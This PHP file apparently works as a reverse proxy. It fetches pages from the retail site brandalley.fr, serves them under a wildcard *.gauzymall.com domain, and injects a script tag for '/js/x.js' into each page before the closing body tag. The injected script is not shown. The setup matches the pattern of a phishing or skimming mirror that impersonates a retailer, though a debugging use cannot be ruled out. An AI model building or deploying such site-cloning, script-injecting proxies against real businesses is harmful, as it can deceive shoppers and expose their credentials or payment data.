<?php
/*
 * ServerAlias *.gauzymall.com
 * VirtualDocumentRoot /var/www/www/data/www/%0
 */
include("config.php");
$url = "https://www-v6.brandalley.fr";
/*if(isset($_REQUEST["xray_origin_host"])){
    $url = $_REQUEST["xray_origin_host"];
    setcookie("xray_origin_host",$url);
}
else if(isset($_COOKIE["xray_origin_host"])){
    $url = $_COOKIE["xray_origin_host"];
}
else {
    echo '<!doctype html>';
    echo '<html><head></head>';
    echo '<body><div style="width:100%;height:100%;text-align:center;vertical-align:middle;">';
    echo "<form action='/' style='display:inline-block;'><input name='xray_origin_host' /><button type='submit'>set</button></form>";
    echo '</div></body></html>';
    exit;
}*/
$f = new \g\Fetcher(["url"=>$url]);
$content =  $f->get();
$content = preg_replace("/\<\/body>/i","<script src='/js/x.js'></script></body>",$content);
$f->pull($content);
?>
